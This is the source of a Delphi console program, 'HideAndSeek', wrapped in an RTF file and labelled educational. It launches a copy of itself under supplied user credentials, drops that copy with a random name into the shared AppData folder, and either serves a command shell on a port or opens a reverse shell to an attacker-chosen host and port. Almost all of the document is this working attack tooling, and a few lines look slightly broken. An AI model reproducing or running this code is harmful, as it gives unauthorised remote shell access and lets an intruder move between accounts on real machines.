{\rtf1\ansi\ansicpg1252\cocoartf2639
\cocoatextscaling0\cocoaplatform0{\fonttbl\f0\fswiss\fcharset0 Helvetica;}
{\colortbl;\red255\green255\blue255;}
{\*\expandedcolortbl;;}
\margl1440\margr1440\vieww18560\viewh14220\viewkind0
\pard\tx720\tx1440\tx2160\tx2880\tx3600\tx4320\tx5040\tx5760\tx6480\tx7200\tx7920\tx8640\pardirnatural\partightenfactor0

\f0\fs24 \cf0 (*******************************************************************************\
\
\
\
  This is a for educational purposes only.\
  Hide and Seek v1\
\
\
*******************************************************************************)\
\
program HideAndSeek;\
\
\{$APPTYPE CONSOLE\}\
\
\{$R *.res\}\
\
uses\
  Windows,\
  Winsock2,\
  math,\
  SysUtils,\
  UntStdoutShell in 'Units\\UntStdoutShell.pas',\
  UntWinApiDefs in 'Units\\UntWinApiDefs.pas',\
  UntFunctions in 'Units\\UntFunctions.pas',\
  UntTypesDefs in 'Units\\UntTypesDefs.pas',\
  UntGlobalsDefs in 'Units\\UntGlobalsDefs.pas',\
  UntStdHandler in 'Units\\UntStdHandler.pas';\
\
\{-------------------------------------------------------------------------------\
  Usage Banner\
-------------------------------------------------------------------------------\}\
function DisplayHelpBanner() : String;\
begin\
  result := '';\
  ///\
\
  WriteLn;\
\
  WriteLn('-----------------------------------------------------------');\
\
  Write('HideAndSeek (Networked Version) By ');\
\
  WriteColoredWord(' McLovin ');\
\
  Write('(');\
\
  WriteColoredWord('Cres en dios?');\
\
  WriteLn(')');\
\
\
  WriteLn('https://www.google.com/');\
  WriteLn('https://www.google.com/');\
  WriteLn('-----------------------------------------------------------');\
\
  WriteLn;\
\
  WriteLn('HideAndSeek.exe -u <username> -p <password>');\
\
  WriteLn;\
\
  WriteLn('-u      : Specify username.');\
  WriteLn('-p      : Specify password.');\
  WriteLn('-d      : Specify domain name.');\
  WriteLn;\
  WriteLn('Bellow option are only concerned by Reverse Shell Mode:');\
  WriteLn('-r      : Netcat)');\
  WriteLn('--lhost : localhost');\
  WriteLn('--lport  : 443');\
\
  WriteLn;\
end;\
\
var\
  SET_LHOST       : String     = ''; //'macbook.local';\
  SET_LPORT       : Integer    = 0;\
  SET_USERNAME    : String     = '';\
  SET_PASSWORD    : String     = '';\
  SET_DOMAINNAME  : String     = '';\
  SET_SHELL       : TShellKind = skDefault;\
  SET_RSHELL      : Boolean    = false;\
\
  LWSA            : TWSAData;\
  LStdoutShell    : TStdoutShell;\
  LStdHandler     : TStdHandler;\
  LDirectory      : String;\
  LMutex          : THandle;\
  LEntry          : TEntryKind = ekUnknown;\
  LOnConnectEvent : THandle;\
  LEventSecAttr   : TSecurityAttributes;\
  LCommand        : AnsiString;\
  LCommandLine    : String;\
\
begin\
  isMultiThread := True;\
  try\
    LMutex := 0;\
    try\
      if ((NOT IsMutexAssigned(LSTDOUT_MUTEX_NAME)) and\
          (NOT IsMutexAssigned(LSTDIN_MUTEX_NAME)))\
      then\
        LEntry := ekStdin\
      else if IsMutexAssigned(LSTDIN_MUTEX_NAME)\
      then\
        LEntry := ekStdout;\
      ///\
\
      \{-------------------------------------------------------------------------\
        Parse Parameters\
      -------------------------------------------------------------------------\}\
      if NOT GetCommandLineOption('u', SET_USERNAME) then\
        raise Exception.Create('');\
\
      if NOT GetCommandLineOption('p', SET_PASSWORD) then\
        raise Exception.Create('');\
\
      GetCommandLineOption('d', SET_DOMAINNAME);\
\
      \{-------------------------------------------------------------------------\
        Stdin, Stdout, Stderr Handlers\
      -------------------------------------------------------------------------\}\
      case LEntry of\
        ekStdin : begin\
          \{\
            Parse Parameters only concerned by ekStdin.\
          \}\
          SET_RSHELL := CommandLineOptionExists('r');\
          if SET_RSHELL then begin\
            if NOT GetCommandLineOption('lhost', SET_LHOST) then\
              raise Exception.Create('');\
\
            if NOT GetCommandLineOption('lport', SET_LPORT) then\
              raise Exception.Create('');\
\
            if (SET_LPORT < 0) or (SET_LPORT > High(Word)) then\
              raise Exception.Create('');\
          end;\
\
          \{\
            Stdin (RunAs Launcher + on local Server)\
          \}\
          Debug(Format('Create Global Mutex=[%s]', [LSTDIN_MUTEX_NAME]));\
          ///\
\
          LMutex := CreateGlobalMutex(PWideChar(LSTDIN_MUTEX_NAME));\
          if (LMutex = 0) then begin\
            DumpLastError('CreateGlobalMutex');\
\
            Exit();\
          end;\
          ///\
\
          LDirectory := GetCommonAppData() + 'RunAsAttached';\
          ///\
\
          Debug(Format('Create output directory=[%s]', [LDirectory]));\
\
          if NOT ForceDirectories(LDirectory) then begin\
            DumpLastError('ForceDirectories');\
\
            Exit();\
          end;\
\
          \
          LDirectory := Format('%s\\%s%s', [LDirectory, RandomName(8), ExtractFileExt(GetModuleName(0)), SET_LPORT]);\
\
          Debug(Format('Copy source file to dest=[%s]', [LDirectory]));\
\
          if NOT CopyFile(PWideChar(GetModuleName(0)), PWideChar(LDirectory), False) then begin\
            DumpLastError('CopyFile');\
\
            Exit();\
          end;\
\
          // In a near future I will improve everything related to commandline and how\
          // I pass arguments. This is temporary.\
          if SET_RSHELL then begin\
            \{\
              Replay Command Line\
            \}\
            LCommandLine := GetCommandLineW(); // Get current command line\
            Delete(LCommandLine, 1, Pos(' ', LCommandLine)); // remove first arg\
          end else begin\
            \{\
              Re-Forge Command Line\
            \}\
            Randomize;\
\
            SET_LPORT := RandomRange(50000, High(Word)); // Chose a random port\
\
            LCommandLine := Format('-u %s -p %s -l --lport %d', [SET_USERNAME, SET_PASSWORD, SET_LPORT]);\
\
            if (SET_DOMAINNAME <> '') then\
              LCommandLine := Format('%s -d %s', [LCommandLine, SET_DOMAINNAME]);\
          end;\
\
          if NOT CreateProcessAsUser(LDirectory, LCommandLine, SET_USERNAME, SET_PASSWORD, SET_DOMAINNAME) then\
            Exit();\
\
          if SET_RSHELL and (SET_LHOST <> '') then begin\
            \{\
              Reverse Shell Mode (Detached)\
\
            \}\
            Debug('CTRL+C to close Stdout Handler Process.');\
\
            Sleep(2000);\
\
            \{\
              Monitor User Child Process\
            \}\
            while True do begin\
              if NOT IsMutexAssigned(LSTDOUT_MUTEX_NAME) then\
                break;\
              ///\
\
              Sleep(100);\
            end;\
\
            Debug('Stdout Handler process died, closing application...');\
\
            DeleteFile(LDirectory);\
          end else begin\
            \{\
              Local Shell (Attached)\
            \}\
            if (WSAStartup($0202, LWSA) <> 0) then\
              Exit();\
            try\
              ZeroMemory(@LEventSecAttr, SizeOf(TSecurityAttributes));\
              LOnConnectEvent := CreateEvent(@LEventSecAttr, false, false, PWideChar(EVENT_CONNECTED));\
              if (LOnConnectEvent = 0) then begin\
                DumpLastError('CreateEvent');\
\
                Exit();\
              end;\
              try\
                Debug('CTRL+C to close Std Handlers processes.');\
                WriteLn;\
\
                LStdHandler := TStdHandler.Create(SET_LPORT);\
\
                WaitForSingleObject(LOnConnectEvent, INFINITE); // will always run and rewrite as random\
\
                \{\
                  Stdin\
                \}\
                while True do begin\
                  ReadLn(LCommand);\
\
                  LCommand := (LCommand + #13#10);\
\
                  \{\
                    Post Command to TStdout Thread.\
                  \}\
                  PostThreadMessage(\
                                      LStdHandler.ThreadID,\
                                      WM_COMMAND,\
                                      NativeUInt(LCommand),\
                                      (Length(LCommand) * SizeOf(AnsiChar))\
                  );\
                end;\
              finally\
                CloseHandle(LOnConnectEvent);\
              end;\
            finally\
              WSACleanup();\
            end;\
          end;\
        end;\
\
        \{\
          Stdout / Stderr Thread (Client)\
        \}\
        ekStdout : begin\
          if NOT GetCommandLineOption('lport', SET_LPORT) then\
            raise Exception.Create('');\
\
          if NOT CommandLineOptionExists('l') then begin          \
            if NOT GetCommandLineOption('lhost', SET_LHOST) then\
              raise Exception.Create('');\
          end;\
          ///\
\
          LMutex := CreateGlobalMutex(PWideChar(LSTDOUT_MUTEX_NAME));\
          if (LMutex = 0) then\
            Exit();\
\
          if (WSAStartup($0202, LWSA) <> 0) then\
            Exit();\
          try\
            LStdoutShell := TStdoutShell.Create(SET_LHOST, SET_LPORT, SET_SHELL);\
\
            LStdoutShell.WaitFor();\
          finally\
            WSACleanup();\
          end;\
        end;\
      end;\
    finally\
      if (LMutex <> 0) then begin\
        CloseHandle(LMutex);\
      end;\
    end;\
  except\
    on E: Exception do begin\
      if (E.Message <> '') then\
        Debug(Format('Exception in class=[%s], message=[%s]', [E.ClassName, E.Message]), dlError)\
      else\
        DisplayHelpBanner();\
    end;\
  end;\
end.\
}